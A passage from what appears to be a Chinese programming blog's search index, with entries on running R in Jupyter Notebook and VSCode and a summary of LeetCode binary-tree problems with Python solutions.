(carats)", main = "Price-weight relationship")# 坐标轴设置为对数-右图qplot(carat, price, data = dsmall, log = "xy")本文是《ggplot2-数据分析与图形艺术》的笔记]]></content>
      <categories>
        <category>R</category>
        <category>数据可视化</category>
      </categories>
      <tags>
        <tag>R</tag>
        <tag>数据可视化</tag>
        <tag>ggplot2</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Jupyter Notebook中使用R语言]]></title>
    <url>%2Farchives%2F3aa9fd39.html</url>
    <content type="text"><![CDATA[既然我们是用R语言来做数据分析，那么就不得不提到Jupyter Notebook。Jupyter Notebook是以网页的形式打开，这样我们可以在网页中直接编写代码和运行代码，代码的运行结果也会直接在代码块下显示，非常方便直观。如果在编程过程中需要编写说明文档，可在同一个页面中直接编写，便于作及时的说明和解释。R版本：3.6.1Jupyter Notebook版本：1.0.0Jupyter Notebook安装安装Jupyter Notebook的前提是需要安装了Python。然后可以通过pip进行安装，cmd中输入：升级pip到最新版本1pip install --upgrade pip注意：老版本的pip在安装Jupyter Notebook过程中或面临依赖项无法同步安装的问题。因此强烈建议先把pip升级到最新版本。安装Jupyter Notebook1pip install jupyter运行Jupyter Notebook直接在终端中输入以下命令：1jupyter notebook执行命令之后，在终端中将会显示一系列notebook的服务器信息，同时浏览器将会自动启动Jupyter Notebook。注意：之后在Jupyter Notebook的所有操作，都请保持终端不要关闭，因为一旦关闭终端，就会断开与本地服务器的链接。Jupyter Notebook里添加R核这里需要提前安装好R。在R Console中输入1install.packages(c('repr', 'IRdisplay', 'evaluate', 'crayon', 'pbdZMQ', 'devtools', 'uuid', 'digest'))安装IRkernel包，在R Console中输入1devtools::install_github('IRkernel/IRkernel')使R在Jupyter Notebook中可以被探测到，在R Console中输入1IRkernel::installspec(user = FALSE)通过设置user=FALSE安装在系统中，如果缺省，即IRkernel::installspec()，则只在当前用户下安装。运行结果：1[InstallKernelSpec] Installed kernelspec ir in C:\ProgramData\jupyter\kernels\ir至此，安装完成。测试测试一下是否安装成功。再次打开jupyter notebook，在右侧新建的下拉选择里面出现R，就代表安装成功了。至此，Jupyter Notebook里已正确添加R核。参考Jupyter Notebook介绍、安装及使用教程]]></content>
      <categories>
        <category>R</category>
        <category>环境</category>
      </categories>
      <tags>
        <tag>R</tag>
        <tag>Jupyter Notebook</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[VSCode中配置R语言运行环境]]></title>
    <url>%2Farchives%2Feb2dec05.html</url>
    <content type="text"><![CDATA[在使用R语言的大部分用户中，RStudio都是首选的IDE。凭借其完善的功能和特性，RStudio似乎成了R语言理所当然的选择。不过一些时候，我们可能并不需要特别多的复杂功能，因此，我尝试在VSCode这个轻量级的通用代码编辑器中配置R语言运行环境。安装R首先我们需要安装R 核心程序。插件安装如果你曾经在VSCode中使用过Python插件，实际上只需要微软出品的这一个插件就差不多可以开始工作了。但作为小众语言，R的插件并不是官方开发，而是由第三方开发者贡献的。这也导致配置一个尚可的R环境需要从四处安装不同的东西，才能开始工作。R首先，在Visual Studio Code的应用商店中搜索扩展R，然后我们可以按照扩展说明进行配置：For Windows, set config r.rterm.windows to your R.exe Path like “C:\Program Files\R\R-3.3.4\bin\x64\R.exe”;For Radian console, enable config r.bracketedPasteOpen your folder that has R source file (Can’t work if you open only file)Use F1 key and R: command or Ctrl+Enter(Mac: ⌘+Enter)首先配置R语言的可执行文件位置，也就是R.exe的位置配置好之后需要重新加载。新建窗口，打开自己编写的 r 文件。选中执行是 ctrl + Enter执行文件是 ctrl + Shift + s 或者 点击右上角的小图标R LSP Client如果只安装上面这个R插件，很多代码不能自动补全，尤其是来自第三方包的命令。这对强烈依赖第三方包的R简直是致命的。这时就需要安装另外的一个插件：R LSP Client。LSP 是Language Server Protocol 的缩写。简单来说，LSP 为不同语言在不同编辑器或IDE 中的自动补全、查找定义、悬停查看函数文档等功能搭建了桥梁，使得开发者可以减少针对不同语言和不同编辑器的重复开发。对用户来说，使用这一功能意味着可以获得更好的自动补全、查看帮助文档等特性。注意：安装了这个插件后，你会发现自动补全依然没有出现。实际上，插件只是在编辑器一侧提供了实现LSP的条件，而在R语言一侧还需要另外的包languageserver来完成搭接。在R环境中运行如下安装指令：1install.packages("languageserver")然后重启一下VSCode，整个LSP的功能就可以实现了。radian使用R语言很多时候是把编辑器中的代码发送到Console中运行，一些时候也需要直接在Console中运行一些代码进行快速交互。RStudio为Console提供了语法高亮、自动补全等功能的加持，使得在Console中也可以有比较方便的输入输出体验。然而R for VSCode插件默认在Terminal中调用R进程，只会返回朴素的R Console界面，高亮、补全通通不在考虑范围之内。radian为这件事提供了新的可能。它给“性冷淡”的R Console 穿上一身华丽的新衣，也增加了自动补全、多行输入等等特殊能力。我们可以把它加入到VSCode中，或是直接在终端中使用它运行R代码。radian本身是一个Python项目，所以你需要安装有一个Python环境，然后使用pip安装这个包，直接在终端中输入：1pip install -U radian安装完成后，就可以在终端中直接使用命令：1radian由于radian并不是VSCode插件，它可以独立在终端中运行，但带来的问题就是无法在VSCode中默认调用它。好在R for VSCode插件提供了更换R Console 路径的设置。打开VSCode的设置项，找到r的设置。这里有三项相似的设置分别为r.rterm.linux、r.rterm.mac、r.rterm.windows，根据你的系统，找到需要更改的其中一个设置项。但在更改之前，需要知道radian在哪里。比较快捷的方式是在终端中运行：1where radian然后我们将返回的路径粘贴在相应设置的值中。但重启VSCode并运行一个R命令会发现VSCode返回一个类似的错误：1终端进程命令“/Users/caoyue/anaconda3/bin/rtichoke --no-save --no-restore --no-site-file”无法启动 (退出代码: 2)因为R for VSCode插件在开启一个R 进程时，默认带入了三个选项--no-save、--no-restore、--no-site-file。然而根据radian作者的说法，radian的--no-save和--no-restore已经作为默认选项故而无法再传入。因此，在设置中关闭--no-save和no-restore两个选项即可。在VSCode 的设置中，找到r设置下的r.rterm.option，将后面不需要的两项注释掉或删掉即可。当然，你也可以在这里使用自定义的选项。另外的一个问题是，你可能发现更换掉R Console路径后，LSP 带来的效果不见了。这是因为Lanuage Server指向的路径默认随着R Console 变动，而它无法识别radian。我们通过将选项r.rpath.lsp更改为R.exe的默认路径即可修复该问题。到此为止，radian的配置工作结束。参考VS Code中使用R语言扩展的相关配置在VSCode 中配置R 语言运行环境]]></content>
      <categories>
        <category>R</category>
        <category>环境</category>
      </categories>
      <tags>
        <tag>R</tag>
        <tag>VSCode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LeetCode题目总结-二叉树]]></title>
    <url>%2Farchives%2F101cdf53.html</url>
    <content type="text"><![CDATA[树是一种以层次化方式组织和存放数据的特定数据结构。树有两个主要特征：每个项都有多个子节点除了叫做根的特殊的项，所有其他的项都只有一个父节点二叉树(binary tree)是一种特殊的树结构，它每个节点最多有两个子结点，亦称左孩子和右孩子。这里总结了LeetCode中二叉树相关的题目，我把这些题目分成了以下五个部分：二叉树的性质相关题目二叉树的遍历相关题目路径和相关题目二叉树的构建相关题目二叉搜索树相关题目二叉树的存储结构二叉树的存储结构 TreeNode 为：12345class TreeNode(object): def __init__(self, x): self.val = x self.left = None self.right = None二叉树的性质相关题目树的性质判断是树的数据结构比较基本的操作。100-相同的树101-对称二叉树110-平衡二叉树104-二叉树的最大深度111-二叉树的最小深度662-二叉树最大宽度100-相同的树题目描述给定两个二叉树，编写一个函数来检验它们是否相同。如果两个树在结构上相同，并且节点具有相同的值，则认为它们是相同的。示例 1:1234567输入: 1 1 / \ / \ 2 3 2 3 [1,2,3], [1,2,3]输出: true示例 2:1234567输入: 1 1 / \ 2 2 [1,2], [1,null,2]输出: false示例 3:1234567输入: 1 1 / \ / \ 2 1 1 2 [1,2,1], [1,1,2]输出: false思路方法1：递归终止条件与返回值：当两棵树的当前节点都为 null 时返回 true当其中一个为 null 另一个不为 null 时返回 false当两个都不为空但是值不相等时，返回 false执行过程：当满足终止条件时进行返回，不满足时分别判断左子树和右子树是否相同，其中要注意代码中的短路效应。下面是一个图解： 方法2：迭代首先用一个栈来保存根节点p，q。接着不断遍历这个栈。我们从栈中拿出两个元素进行比较，如果这两个元素不等(一个是空一个不为空，或者两个节点的值不等)，就直接返回false。如果这两个节点的值相等，就继续把p节点的左孩子,q节点的左孩子放入栈中；再把p节点的右孩子，q节点的右孩子放入栈中。重复这个步骤，直到栈为空。如果整个循环遍历完了，说明两个树的元素都是相等的，返回true。画解算法：100. 相同的树Python实现方法1：递归123456789101112class Solution: def isSameTree(self, p: TreeNode, q: TreeNode) -&gt; bool: if p == None and q == None: return True if p == None or q == None: return False if p.val != q.val: return False return self.isSameTree(p.left,q.left) and self.isSameTree(p.right,q.right)方法2：迭代123456789101112131415161718class Solution: def isSameTree(self, p: TreeNode, q: TreeNode) -&gt; bool: stack = [] stack.append((p,q)) while stack: p,q = stack.pop() if p == None and q == None: continue elif p == None or q == None: return False elif p.val != q.val: return False elif p.val == q.val: stack.append((p.left,q.left)) stack.append((p.right,q.right)) return True101-对称二叉树题目描述给定一个二叉树，检查它是否是镜像对称的。例如，二叉树 [1,2,2,3,4,4,3] 是对称的。12345 1 / \ 2 2 / \ / \3 4 4 3但是下面这个 [1,2,2,null,3,null,3] 则不是镜像对称的:12345 1 / \2 2 \ \ 3 3说明：如果你可以运用递归和迭代两种方法解决这个问题，会很加分。思路如果一个树的左子树与右子树镜像对称，那么这个树是对称的。因此，该问题可以转化为：两个树在什么情况下互为镜像？如果同时满足下面的条件，两个树互为镜像：它们的两个根结点具有相同的值。每个树的右子树都与另一个树的左子树镜像对称。Python实现1234567891011121314151617181920class Solution: def isSymmetric(self, root: TreeNode) -&gt; bool: if root == None: return True return self.isMirror(root.left,root.right) def isMirror(self, t1, t2): if t1 == None and t2 == None: return True if t1 == None or t2 == None: return False if t1 != None and t2 != None: if t1.val == t2.val: return self.isMirror(t1.left,t2.right) and self.isMirror(t1.right,t2.left) else: return False110-平衡二叉树题目描述给定一个二叉树，判断它是否是高度平衡的二叉树。本题中，一棵高度平衡二叉树定义为：一个二叉树每个节点的左右两个子树的高度差的绝对值不超过1。示例 1:12345678给定二叉树 [3,9,20,null,null,15,7] 3 / \ 9 20 / \ 15 7返回 true 。示例 2:12345678910给定二叉树 [1,2,2,3,3,null,null,4,4] 1 / \ 2 2 / \ 3 3 / \ 4 4返回 false 。思路方法1：自顶向下暴力递归构造一个获取当前节点最大深度的方法 depth() ，通过比较左右子树最大高度差abs(self.depth(root.left) - self.depth(root.right))，来判断以此节点为根节点下是否是二叉平衡树；从顶至底DFS，以每个节点为根节点，递归判断是否是平衡二叉树：若所有根节点都满足平衡二叉树性质，则返回 True ；若其中任何一个节点作为根节点时，不满足平衡二叉树性质，则返回False。本方法产生大量重复的节点访问和计算，最差情况下时间复杂度 O(N^2)。方法2：自底向上（提前阻断）对二叉树做深度优先遍历DFS，递归过程中：终止条件：当DFS越过叶子节点时，返回高度0；返回值：从底至顶，返回以每个节点root为根节点的子树最大高度（左右子树中最大的高度值加1，即max(left,right) + 1)）当我们发现有一例 左/右子树高度差 ＞ 1 的情况时，代表此树不是平衡树，返回-1当发现不是平衡树时，后面的高度计算都没有意义了，因此一路返回-1，避免后续多余计算。最差情况是对树做一遍完整DFS，时间复杂度为 O(N)。Python实现方法1：123456789101112131415161718192021class Solution: def isBalanced(self, root: TreeNode) -&gt; bool: if root == None: return True # 当前节点满足平衡树，继续递归判断子树是否满足平衡树条件 if abs(self.depth(root.left)-self.depth(root.right)) &lt;= 1: return self.isBalanced(root.left) and self.isBalanced(root.right) else: return False # 计算树高度 def depth(self, root): if root == None: return 0 if root.left == None and root.right == None: return 1 if root.left != None or root.right != None: return 1+max(self.depth(root.left),self.depth(root.right))方法2：1234567891011121314151617181920212223242526class Solution: def isBalanced(self, root: TreeNode) -&gt; bool: if self.depth(root) == -1: return False else: return True def depth(self, root): if root == None: return 0 depth_left = self.depth(root.left) # 提前阻断 if depth_left == -1: return -1 depth_right = self.depth(root.right) # 提前阻断 if depth_right == -1: return -1 if abs(depth_left-depth_right) &lt;= 1: return 1+max(depth_left,depth_right) # 提前阻断 else: return -1104-二叉树的最大深度题目描述给定一个二叉树，找出其最大深度。二叉树的深度为根节点到最远叶子节点的最长路径上的节点数。说明：叶子节点是指没有子节点的节点。示例：给定二叉树 [3,9,20,null,null,15,7]，12345 3 / \9 20 / \ 15 7返回它的最大深度 3 。思路方法1：迭代层次遍历二叉树，如果树为空，直接返回0。否则将树和深度值1入队列，逐一弹出队列中节点：若某节点左右子树均为空，此节点即为叶子节点，我们将它的深度和最大深度max_depth进行比较，更新最大深度。若其存在子树，则将其存在的子树和子树深度入队列。方法2：递归递归结束条件：当 root 节点左右孩子都为空（叶子节点）时，返回 1当 root 节点左右孩子至少有一个不为空时，返回左右孩子较大深度的节点值Python实现方法1：123456789101112131415161718class Solution: def maxDepth(self, root: TreeNode) -&gt; int: if root == None: return 0 queue = [(root,1)] max_depth = 0 while queue: node,depth = queue.pop(0) max_depth = max(max_depth,depth) if node.left != None: queue.append((node.left,depth+1)) if node.right != None: queue.append((node.right,depth+1)) return max_depth方法2：123456789101112class Solution: def maxDepth(self, root: TreeNode) -&gt; int: if root == None: return 0 # 叶子节点，返回1 if root.left == None and root.right == None: return 1 # 当左右孩子至少有一个不为空时，返回左右孩子较大深度的节点值 if root.left != None or root.right != None: return 1+max(self.maxDepth(root.left),self.maxDepth(root.right))111-二叉树的最小深度题目描述给定一个二叉树，找出其最小深度。最小深度是从根节点到最近叶子节点的最短路径上的节点数量。说明: 叶子节点是指没有子节点的节点。示例：给定二叉树[3,9,20,null,null,15,7],12345 3 / \9 20 / \ 15 7返回它的最小深度2.思路方法1：迭代层次遍历二叉树，如果树为空，直接返回0。否则将树和深度值1入队列，逐一弹出队列中节点：若某节点左右子树均为空，此节点即为叶子节点，我们将它的深度和最小深度min_depth进行比较，更新最小深度。若其存在子树，则将其存在的子树和子树深度入队列。实际上，因为层次遍历是一层一层遍历的，所以第一个叶子节点即为最小深度的叶子节点，直接返回其深度即可。这样就不用遍历所有的节点。方法2：递归递归解法的关键是搞清楚递归结束条件：当 root 节点左右孩子都为空（叶子节点）时，返回 1当 root 节点左右孩子有一个为空时，返回不为空的孩子节点的深度当 root 节点左右孩子都不为空时，返回左右孩子较小深度的节点值Python实现方法1：1234567891011121314151617class Solution: def minDepth(self, root: TreeNode) -&gt; int: if root == None: return 0 queue = [(root,1)] while queue: node,depth = queue.pop(0) if node.left == None and node.right == None: return depth if node.left != None: queue.append((node.left,depth+1)) if node.right != None: queue.append((node.right,depth+1))方法2：12345678910111213141516class Solution: def minDepth(self, root: TreeNode) -&gt; int: if root == None: return 0 # 叶子节点，返回1 if root.left == None and root.right == None: return 1 # 当左右孩子有一个为空时，返回不为空的孩子节点的深度 if root.left == None or root.right == None: return 1+max(self.minDepth(root.left),self.minDepth(root.right)) # 当左右孩子都不为空时，返回左右孩子较小深度的节点值 if root.left != None and root.right != None: return 1+min(self.minDepth(root.left),self.minDepth(root.right))662-二叉树最大宽度题目描述给定一个二叉树，编写一个函数来获取这个树的最大宽度。树的宽度是所有层中的最大宽度。这个二叉树与满二叉树（full binary tree）结构相同，但一些节点为空。每一层的宽度被定义为两个端点（该层最左和最右的非空节点，两端点间的null节点也计入长度）之间的长度。示例 1:12345678910输入: 1 / \ 3 2 / \ \ 5 3 9 输出: 4解释: 最大值出现在树的第 3 层，宽度为 4 (5,3,null,9)。示例 2:12345678910输入: 1 / 3 / \ 5 3 输出: 2解释: 最大值出现在树的第 3 层，宽度为 2 (5,3)。示例 3:12345678910输入: 1 / \ 3 2 / 5 输出: 2解释: 最大值出现在树的第 2 层，宽度为 2 (3,2)。示例 4:1234567891011输入: 1 / \ 3 2 / \ 5 9 / \ 6 7输出: 8解释: 最大值出现在树的第 4 层，宽度为 8 (6,null,null,null,null,null,null,7)。注意: 答案在32位有符号整数的表示范围内。思路因为两端点间的None值也计入，所以这里我们不能简单的统计每一层的节点数，这里我们可以考虑给树中的每一个节点进行编号，根节点为1，然后如果是左节点，值为根节点的二倍；如果是右节点，值为根节点的二倍加一。这里我用层次遍历，采用一个队列记录每一个节点的节点以及号码，一层的首末元素的编号差就是该层的最大宽度。Python实现12345678910111213141516171819202122class Solution: def widthOfBinaryTree(self, root: TreeNode) -&gt; int: queue = [(root,1)] width = 0 while queue: length = len(queue) for i in range(length): node,nums = queue.pop(0) # 记录该层第一个节点的编号、最后一个节点的编号 if i == 0: first_num = nums if i == length-1: last_num = nums # 更新最大宽度 width = max(width,last_num-first_num+1) # 左右子树入队 if node.left != None: queue.append((node.left,2*nums)) if node.right != None: queue.append((node.right,2*nums+1)) return width二叉树的遍历相关题目遍历的含义就是把树的所有节点（Node）按照某种顺序访问一遍。包括前序，中序，后序，层序4种遍历方法。以图的深度优先搜索为原型的遍历144-二叉树的前序遍历94-二叉树的中序遍历145-二叉树的后序遍历在这种类型中，递归的实现方式是非常简单的，只需要递归左右结点，直到结点为空作为结束条件就可以，哪种序就取决于你访问结点的时间。不过一般这不能满足面试官的要求，可能会接着问能不能用非递归实现一下，这个说起来比较简单，其实就是用一个栈手动模拟递归的过程。有时候非递归还是不能满足面试官，还会问一问，上面的做法时间和空间复杂度是多少。我们知道，正常遍历时间复杂度是O(n)，而空间复杂度是则是递归栈（或者自己维护的栈）的大小，也就是O(logn)。他会问能不能够在常量空间内解决树的遍历问题呢？确实还真可以，这里就要介绍一下Morris遍历。Morris遍历方法用了线索二叉树，这个方法不需要为每个节点额外分配指针指向其前驱和后继结点，而是利用叶子节点中的右空指针指向中序遍历下的后继节点就可以了。这样就节省了需要用栈来记录前驱或者后继结点的额外空间，所以可以达到O(1)的空间复杂度。不过这种方法有一个问题就是会暂时性的改动树的结构，这在程序设计中并不是很好的习惯，这些在面试中都可以和面试官讨论，一般来说问到这里不会需要进行Morris遍历方法的代码实现了，只需要知道这种方法和他的主要优劣势就可以了。以图的广度优先搜索为原型的遍历，在树中称为层序遍历，LeetCode中有三种：自顶向下层序、自底向上层序、锯齿层序遍历。102-二叉树的层次遍历103-二叉树的锯齿形层次遍历107-二叉树的层次遍历ii自顶向下层序遍历其实比较简单，代码基本就是图的广度优先搜索，思路就是维护一个队列存储上一层的结点，逐层访问。而自底向上层序层序遍历则要从最后一层倒序访问上来，这个我没有想到太好的方法，现在的实现就是把自顶向下层序遍历得到的层放入数据结构然后reverse过来。至于锯齿层序遍历因为每一层访问顺序有所改变，而且是每次都反转顺序，这让我们想到栈这个数据结构，所以这里不用队列而改用栈来保存，就可以满足每层反转访问顺序的要求了。层次遍历相关的题目：116-填充每个节点的下一个右侧节点指针117-填充每个节点的下一个右侧节点指针ii513-找树左下角的值515-在每个树行中找最大值详细题解LeetCode 题目总结 - 二叉搜索树路径和相关题目树的求和属于树的题目中比较常见的，因为可以有几种变体，灵活度比较高，也可以考察到对于树的数据结构和递归的理解。112-路径总和113-路径总和ii124-二叉树中的最大路径和129-求根到叶子节点数字之和257-二叉树的所有路径112-路径总和题目描述给定一个二叉树和一个目标和，判断该树中是否存在根节点到叶子节点的路径，这条路径上所有节点值相加等于目标和。说明: 叶子节点是指没有子节点的节点。示例:给定如下二叉树，以及目标和 sum = 22，1234567 5 / \ 4 8 / / \ 11 13 4 / \ \7 2 1返回 true, 因为存在目标和为 22 的根节点到叶子节点的路径 5-&gt;4-&gt;11-&gt;2。思路这道题是判断是否存在从根到叶子的路径和跟给定sum相同。树的题目基本都是用递归来解决，主要考虑两个问题：如何把问题分治成子问题给左子树和右子树。这里就是看看左子树和右子树有没有存在和等于sum减去当前结点值的路径，只要有一个存在，那么当前结点就存在路径。考虑结束条件是什么：结束条件1：如果当前节点是空的，则返回false。结束条件2：如果是叶子，那么如果剩余的sum等于当前叶子的值，则找到满足条件的路径，返回true。想清楚上面两个问题，那么实现起来就是一次树的遍历，按照刚才的分析用参数或者返回值传递需要维护的值，然后按照递归条件和结束条件进行返回即可。算法的时间复杂度是一次遍历O(n)，空间复杂度是栈的大小O(logn)。Python实现——递归1234567891011class Solution: def hasPathSum(self, root: TreeNode, sum: int) -&gt; bool: if root == None: return False # 当前节点是叶子，检查 root.val 值是否为 sum if root.left == None and root.right == None and root.val == sum: return True # 当前节点不是叶子，对它的所有孩子节点，递归调用 hasPathSum() 函数 return self.hasPathSum(root.left,sum-root.val) or self.hasPathSum(root.right,sum-root.val)时间复杂度：我们访问每个节点一次，时间复杂度为 O(N) ，其中 N 是节点个数。空间复杂度：最坏情况下，整棵树是非平衡的，例如每个节点都只有一个孩子，递归会调用 N 次（树的高度），因此栈的空间开销是 O(N)。但在最好情况下，树是完全平衡的，高度只有 log(N)，因此在这种情况下空间复杂度只有 O(log(N)) 。Python实现——迭代我们可以用栈将递归转成迭代的形式。栈中保存当前节点前的剩余值就可以了。1234567891011121314151617181920class Solution: def hasPathSum(self, root: TreeNode, sum: int) -&gt; bool: if root == None: return False stack = [(root,sum)] while stack: node,sum = stack.pop() # 判断叶子节点是否满足了条件 if node.left == None and node.right == None and node.val == sum: return True # 左节点不为空，我们把左节点和剩余值打包压栈 if node.left != None: stack.append((node.left,sum-node.val)) # 右节点不为空，我们把右节点和剩余值打包压栈 if node.right != None: stack.append((node.right,sum-node.val)) return False113-路径总和ii题目描述给定一个二叉树和一个目标和，找到所有从根节点到叶子节点路径总和等于给定目标和的路径。说明: 叶子节点是指没有子节点的节点。示例:给定如下二叉树，以及目标和 sum = 22，1234567 5 / \ 4 8 / / \ 11 13 4 / \ / \7 2 5 1返回:1234[ [5,4,11,2], [5,8,4,5]]思路这道题思路和112-路径总和是完全一样的，只是需要输出所有路径，所以需要数据结构来维护路径，添加两个参数，一个用来维护走到当前结点的路径，一个用来保存满足条件的所有路径，思路上递归条件和结束条件是完全一致的，空间上这里会依赖于结果的数量了。Python实现——递归123456789101112131415161718192021class Solution: def pathSum(self, root: TreeNode, sum: int) -&gt; List[List[int]]: # 辅助函数（因为需要一个变量记录路径） def helper(root, sum, temp): if root == None: return # 路径和满足sum，路径添加到结果数组res if root.left == None and root.right == None and root.val == sum: temp += [root.val] res.append(temp) # 递归搜索左右子树，传入剩余和以及路径 helper(root.left,sum-root.val,temp+[root.val]) helper(root.right,sum-root.val,temp+[root.val]) res = [] helper(root,sum,[]) return resPython实现——迭代1234567891011121314151617181920212223class Solution: def pathSum(self, root: TreeNode, sum: int) -&gt; List[List[int]]: if root == None: return [] res = [] temp = [] stack = [(root,sum,temp)] while stack: node,sum,temp = stack.pop() # 判断叶子节点是否满足了条件 if node.left == None and node.right == None and node.val == sum: temp += [node.val] res.append(temp) if node.left != None: stack.append((node.left,sum-node.val,temp + [node.val])) if node.right != None: stack.append((node.right,sum-node.val,temp + [node.val])) return res129-求根到叶子节点数字之和题目描述给定一个二叉树，它的每个结点都存放一个 0-9 的数字，每条从根到叶子节点的路径都代表一个数字。例如，从根到叶子节点路径 1-&gt;2-&gt;3 代表数字 123。计算从根到叶子节点生成的所有数字之和。说明: 叶子节点是指没有子节点的节点。示例 1:123456789输入: [1,2,3] 1 / \ 2 3输出: 25解释:从根到叶子节点路径 1-&gt;2 代表数字 12.从根到叶子节点路径 1-&gt;3 代表数字 13.因此，数字总和 = 12 + 13 = 25.示例 2:123456789101112输入: [4,9,0,5,1] 4 / \ 9 0 / \5 1输出: 1026解释:从根到叶子节点路径 4-&gt;9-&gt;5 代表数字 495.从根到叶子节点路径 4-&gt;9-&gt;1 代表数字 491.从根到叶子节点路径 4-&gt;0 代表数字 40.因此，数字总和 = 495 + 491 + 40 = 1026.思路这道题目相比112-路径总和，增加了两个变化：每一个结点相当于位上的值。我们只需要每一层乘以10加上自己的值就可以了。所有路径需要累加起来。我们只需要在最后对结果列表进行求和即可。Python实现——递归12345678910111213141516171819202122232425class Solution: def sumNumbers(self, root: TreeNode) -&gt; int: def helper(root, nums): if root == None: return 0 # 更新路径和 nums *= 10 nums += root.val # 如果已经是叶子节点，保存路径和到列表中 if root.left == None and root.right == None: res.append(nums) if root.left != None: helper(root.left,nums) if root.right != None: helper(root.right,nums) res = [] helper(root,0) return sum(res)Python实现——迭代12345678910111213141516171819202122232425class Solution: def sumNumbers(self, root: TreeNode) -&gt; int: if root == None: return 0 stack = [(root,0)] res = [] while stack: node,nums = stack.pop() # 更新路径和 nums *= 10 nums += node.val # 如果已经是叶子节点，保存路径和到列表中 if node.left == None and node.right == None: res.append(nums) if node.left != None: stack.append((node.left,nums)) if node.right != None: stack.append((node.right,nums)) return sum(res)257-二叉树的所有路径题目描述给定一个二叉树，返回所有从根节点到叶子节点的路径。说明: 叶子节点是指没有子节点的节点。示例:1234567891011输入: 1 / \2 3 \ 5输出: [&quot;1-&gt;2-&gt;5&quot;, &quot;1-&gt;3&quot;]解释: 所有根节点到叶子节点的路径为: 1-&gt;2-&gt;5, 1-&gt;3思路我们维护一个队列，存储节点以及根到该节点的路径。一开始这个队列里只有根节点。在每一步迭代中，我们取出队列中的首节点，如果它是一个叶子节点，则将它对应的路径加入到答案中。如果它不是一个叶子节点，则将它的所有孩子节点加入到队列的末尾。当队列为空时，迭代结束。Python实现123456789101112131415161718192021222324252627282930class Solution: def binaryTreePaths(self, root: TreeNode) -&gt; List[str]: if root == None: return None res = [] queue = [(root,'')] while queue: temp = '' length = len(queue) for _ in range(length): node,temp = queue.pop(0) temp += str(node.val) # 如果是叶子节点，记录路径 if node.left == None and node.right == None: res.append(temp) # 格式要求 temp += '-&gt;' if node.left != None: queue.append((node.left,temp)) if node.right != None: queue.append((node.right,temp)) return res二叉树的构建相关题目这类题目本质还是用递归的手法来实现，但是这类题目有一个特点，就是它是构建一棵树，而不是给定一棵树，然后进行遍历，所以实现起来思路上有点逆向。105-从前序与中序遍历序列构造二叉树106-从中序与后序遍历序列构造二叉树108-将有序数组转换为二叉搜索树109-有序链表转换二叉搜索树思路就是在递归中创建根节点，然后找到将元素劈成左右子树的方法，递归得到左右根节点，接上创建的根然后返回。方法还是比较具有模板型的。105-从前序与中序遍历序列构造二叉树题目描述根据一棵树的前序遍历与中序遍历构造二叉树。注意:你可以假设树中没有重复的元素。例如，给出前序遍历 preorder = [3,9,20,15,7]中序遍历 inorder = [9,3,15,20,7]返回如下的二叉树：12345 3 / \9 20 / \ 15 7思路前序遍历数组的第1个数（索引为0）的数一定是二叉树的根结点，于是可以在中序遍历中找这个根结点的索引，然后把“前序遍历数组”和“中序遍历数组”分为两个部分，就分别对应二叉树的左子树和右子树，分别递归完成就可以了。下面是一个具体的例子，演示了如何计算数组子区间的边界：分治法（Python 代码、Java 代码）使用 mapPython实现——递归123456789101112class Solution: def buildTree(self, preorder: List[int], inorder: List[int]) -&gt; TreeNode: if len(preorder) == 0: return None root = TreeNode(preorder[0]) mid = inorder.index(preorder[0]) # 递归构造左子树、右子树 root.left = self.buildTree(preorder[1:mid+1],inorder[0:mid]) root.right = self.buildTree(preorder[mid+1:],inorder[mid+1:]) return root时间复杂度：O(N^2)，这里 N 是二叉树的结点个数，每调用一次递归方法创建一个结点，一共创建 N 个结点，在中序遍历中找到根结点在中序遍历中的位置，是与 N 相关的，这里不计算递归方法占用的时间。空间复杂度：O(1)，这里不计算递归方法占用的空间。Python实现——哈希表优化我们可以用哈希表（字典）来存储中序遍历，这样就可以在O(1)时间复杂度下找到根结点在中序遍历数组中的索引。12345678910111213141516class Solution: def buildTree(self, preorder: List[int], inorder: List[int]) -&gt; TreeNode: if len(preorder) == 0: return None root = TreeNode(preorder[0]) # 哈希表存储中序遍历的值、索引 dicts = &#123;var:i for i,var in enumerate(inorder)&#125; index = dicts[preorder[0]] # 递归构造左子树、右子树 root.left = self.buildTree(preorder[1:index+1],inorder[:index]) root.right = self.buildTree(preorder[index+1:],inorder[index+1:]) return root上面的代码在递归函数里面建立哈希表，这会导致哈希表一共建立二叉树节点个数次（即N次），没有达到我们的优化目的，我们希望的是哈希表仅仅建立一次，后续递归中每次都能有直接调用。下面是优化后的代码：1234567891011121314151617181920212223242526class Solution: def buildTree(self, preorder: List[int], inorder: List[int]) -&gt; TreeNode: # 辅助函数 def helper(pre_left,pre_right,in_left,in_right): if pre_left == pre_right: return None # 构建当前“根” root = TreeNode(preorder[pre_left]) # 从哈希表中找到当前“根”的索引 index = dicts[preorder[pre_left]] # 更新前序遍历、中序遍历边界，然后递归构建左右子树 # 我们可以通过“前序和中序个数是相同”这个隐含条件，求出前序左右边界 root.left = helper(pre_left+1,pre_left+1+index-in_left,in_left,index) # 根据上面用过的，写出剩下的 root.right = helper(pre_left+1+index-in_left,pre_right,index+1,in_right) return root # 哈希表存储中序遍历的值、索引 dicts = &#123;var:i for i,var in enumerate(inorder)&#125; # 调用辅助函数 root = helper(0,len(preorder),0,len(inorder)) return root106-从中序与后序遍历序列构造二叉树题目描述根据一棵树的中序遍历与后序遍历构造二叉树。注意：你可以假设树中没有重复的元素。例如，给出12中序遍历 inorder = [9,3,15,20,7]后序遍历 postorder = [9,15,7,20,3]返回如下的二叉树：12345 3 / \9 20 / \ 15 7思路这道题目类似105题。下面是一个图解：分治法（Python、Java）Python实现——递归123456789101112131415class Solution: def buildTree(self, inorder: List[int], postorder: List[int]) -&gt; TreeNode: if len(postorder) == 0: return None # 后序遍历的最后一个结点就是根结点 root = TreeNode(postorder[-1]) # 在中序遍历中找到根结点的索引，得到左右子树的一个划分 mid = inorder.index(postorder[-1]) # 这里的列表切片使用的是复制值，使用了一些空间，因此空间复杂度是 O(N) root.left = self.buildTree(inorder[:mid],postorder[:mid]) root.right = self.buildTree(inorder[mid+1:],postorder[mid:-1]) return rootPython实现——哈希表优化同样的，我们可以把中序遍历的值和索引放在一个哈希表中，这样就不需要通过遍历得到当前根结点在中序遍历中的位置了。12345678910111213141516171819202122232425class Solution: def buildTree(self, inorder: List[int], postorder: List[int]) -&gt; TreeNode: # 辅助函数 def 